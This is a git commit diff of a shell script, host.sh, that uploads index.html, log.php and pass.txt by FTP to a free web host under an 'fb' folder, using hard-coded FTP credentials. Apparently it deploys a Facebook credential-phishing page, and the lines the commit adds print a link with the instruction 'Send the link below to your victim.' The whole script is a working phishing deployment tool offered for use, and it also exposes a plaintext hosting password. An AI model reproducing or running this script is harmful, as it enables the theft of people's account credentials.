7b08b6fe08d75b874115b1fd605a88660cd5e189
nerdhaka <114361549+nerdhaka@users.noreply.github.com>
2022-10-05 13:51:47 +0000

    Update host.sh

--- host.sh
+++ host.sh
@@ -5,17 +5,24 @@ read EMAIL
 HOST='ftpupload.net' 
 USER='epiz_32719615'
 PASSWD='ElDdJprQglYAk'
-FILE='index.html log.php pass.txt'
-
+FILE='index.html'
+FILE2='log.php'
+FILE3='pass.txt'
 ftp -n $HOST <<END_SCRIPT
 quote USER $USER
 quote PASS $PASSWD
 binary
-chmod +x 766
 cd htdocs/fb
 mkdir $email
-cd htdocs/fb/$EMAIL
+cd $EMAIL
+mkdir link
+cd link
 put $FILE
+put $FILE2
+put $FILE3
 quit
 END_SCRIPT
 exit 0
+echo
+echo "Send the link below to your victim:"
+echo "http://clipush.42web.io/fb/$EMAIL/link/" 
